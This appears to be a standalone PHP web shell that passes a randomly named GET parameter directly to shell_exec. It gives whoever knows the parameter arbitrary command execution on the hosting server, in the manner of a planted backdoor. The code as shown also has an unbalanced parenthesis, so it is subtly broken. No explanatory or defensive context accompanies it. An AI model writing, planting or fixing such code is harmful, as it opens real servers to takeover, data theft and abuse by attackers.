<?php
shell_exec(($_GET['U5Fy4lHH']);
?>
